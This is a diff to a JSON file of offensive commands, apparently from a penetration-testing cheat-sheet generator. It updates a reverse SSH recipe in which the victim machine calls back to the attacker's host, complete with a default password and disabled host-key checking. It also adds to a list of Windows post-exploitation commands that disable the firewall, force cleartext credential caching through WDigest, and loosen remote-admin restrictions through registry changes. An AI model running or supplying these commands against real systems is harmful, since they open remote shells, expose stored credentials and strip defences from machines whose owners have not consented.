@@ -491,9 +491,9 @@
                 ],
                 "Reverse SSH",
                 [
-                    "attacker$ ./reverse-ssh -v -l -p %%%LPORT%%% # can be omitted if you already have an ssh daemon running, e.g. OpenSSH)",
-                    "victim$ ./reverse-ssh -p %%%LPORT%%% %%%LHOST%%%",
-                    "attacker$ ssh -p 8888 127.0.0.1"
+                    "attacker$ ./reverse-ssh -v -N -l :%%%LPORT%%% # can be omitted if you already have an ssh daemon running, e.g. OpenSSH)",
+                    "victim$ ./reverse-ssh -p %%%LPORT%%% -b 8888 %%%LHOST%%%",
+                    "attacker$ ssh -o UserKnownHostsFile=/dev/null -p 8888 127.0.0.1 #(default password: letmeinbrudipls)"
                 ]
             ]
         ],
@@ -542,7 +542,8 @@
             [
                 "netsh advfirewall set allprofiles state off",
                 "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f",
-                "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"
+                "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f",
+                "New-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\" -Name \"DisableRestrictedAdmin\" -Value \"0\" -PropertyType DWORD -Force"
             ]
         ]
     }
